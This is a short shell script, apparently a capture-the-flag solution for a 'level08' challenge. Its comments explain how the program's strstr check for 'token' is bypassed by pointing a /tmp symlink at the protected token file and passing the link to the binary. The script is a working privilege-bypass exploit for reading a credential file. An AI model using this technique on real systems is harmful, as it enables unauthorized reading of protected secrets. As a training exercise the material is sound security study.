#!/bin/sh

# level08 uses strstr to search the arg for 'token' if it returns true the
# exe returns with an error msg.
# To avoid that we create a symbolic link so when the strstr searches
# the arg it doesn't find the 'token' substring but when 'open'
# is called on the arg the link is followed and the token file in the home
# folder is opened.

ln -sf /home/user/level08/token /tmp/flag08
/home/user/level08/level08 /tmp/flag08

